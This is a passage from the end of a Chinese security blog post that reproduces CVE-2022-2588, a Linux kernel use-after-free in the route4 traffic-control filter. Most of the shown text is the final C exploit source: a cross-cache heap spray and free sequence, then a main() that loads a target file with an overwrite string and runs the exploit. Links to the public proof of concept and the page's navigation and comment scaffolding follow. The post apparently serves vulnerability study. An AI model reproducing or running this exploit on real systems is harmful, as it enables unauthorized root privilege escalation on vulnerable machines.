<span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;read from parent&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// add_tc_basic(sprayfd, middle+2, payload, 129, 32);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// prepare another part for cross cache</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;spray 256 done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; end - <span class="number">24</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// prevent double free of 192</span></span><br><span class="line">                <span class="comment">// and being reclaimed by others</span></span><br><span class="line">                <span class="keyword">if</span> (i == middle || i == middle + <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;write to parent\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// free route4 here</span></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;read from parent&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// if (cpu_cores == 1) sleep(1);</span></span><br><span class="line">            delete_tc_basic(sprayfd, middle + <span class="number">2</span>);</span><br><span class="line">            delete_tc_basic(sprayfd, middle + <span class="number">3</span>);</span><br><span class="line">            delete_tc_basic(sprayfd, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;256 freed done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;write to parent\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    global = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE | PROT_EXEC,</span><br><span class="line">                          MAP_SHARED | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(global, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    self_path = global;</span><br><span class="line">    <span class="built_in">snprintf</span>(self_path, <span class="number">0x100</span>, <span class="string">&quot;%s/%s&quot;</span>, get_current_dir_name(), argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;self path %s\n&quot;</span>, self_path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(target, <span class="number">0</span>);</span><br><span class="line">    content = (<span class="keyword">char</span> *)(global + <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(content, overwrite);</span><br><span class="line">    read(fd, content + <span class="built_in">strlen</span>(overwrite), <span class="number">0x1000</span>);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    assert(pipe(pipe_main) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prepare done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        run_exp();</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sleep(<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    read(pipe_main[<span class="number">0</span>], &amp;data, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;succeed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>参考链接：</p>
<p>​    <a class="link"   target="_blank" rel="noopener" href="https://github.com/Markakd/CVE-2022-2588" >https://github.com/Markakd/CVE-2022-2588<i class="fas fa-external-link-alt"></i></a></p>
<p>​    <a class="link"   target="_blank" rel="noopener" href="https://paper.seebug.org/2019/" >https://paper.seebug.org/2019/<i class="fas fa-external-link-alt"></i></a></p>
<p>​    <a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.14/source" >https://elixir.bootlin.com/linux/v5.14/source<i class="fas fa-external-link-alt"></i></a></p>

        </div>

        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2023/11/10/syzkaller%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">syzkaller基本使用</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2023/10/15/CVE-2022-0185/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">CVE-2022-0185复现</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
            <div class="comment-container">
                <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments">&nbsp;评论</i>
    </div>
    

        
            
    <div class="valine-container">
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script >
            function loadValine() {
                new Valine({
                    el: '#vcomments',
                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
                    meta: ['nick', 'mail', 'link'],
                    avatar: 'wavatar',
                    enableQQ: true,
                    placeholder: '😜若有问题请各位大师傅留言评论',
                    lang: 'zh-CN'.toLowerCase()
                });

                function getAuthor(language) {
                    switch (language) {
                        case 'en':
                            return 'Author';
                        case 'zh-CN':
                            return '博主';
                        default:
                            return 'Master';
                    }
                }

                // Add "Author" identify
                const getValineDomTimer = setInterval(() => {
                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
                    if (vcards.length > 0) {
                        let author = '196082';

                        if (author) {
                            for (let vcard of vcards) {
                                const vnick_dom = vcard.querySelector('.vhead .vnick');
                                const vnick = vnick_dom.innerHTML;
                                if (vnick === author) {
                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                                }
                            }
                        }
                        clearInterval(getValineDomTimer);
                    } else {
                        clearInterval(getValineDomTimer);
                    }
                }, 2000);
            }

            if ('false') {
                const loadValineTimeout = setTimeout(() => {
                    loadValine();
                    clearTimeout(loadValineTimeout);
                }, 1000);
            } else {
                window.addEventListener('DOMContentLoaded', loadValine);
            }
        </script>
    </div>



        
    
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2021</span>&nbsp;-&nbsp;
            
            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
        </div>
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fas fa-comment"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Rtnetlink%E7%AE%80%E8%BF%B0"><span class="nav-text">Rtnetlink简述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"><span class="nav-text">实现原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cross-cache"><span class="nav-text">cross-cache</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%B6%E9%95%BF%E6%97%B6%E9%97%B4%E7%AA%97%E5%8F%A3"><span class="nav-text">延长时间窗口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AF%87%E5%A4%96CVE-2023-3269"><span class="nav-text">篇外CVE-2023-3269</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8C%E5%8F%AF%E5%BE%97exp"><span class="nav-text">综上，可得exp</span></a></li></ol></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>


<div class="post-scripts">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
    
</div>



</body>
</html>
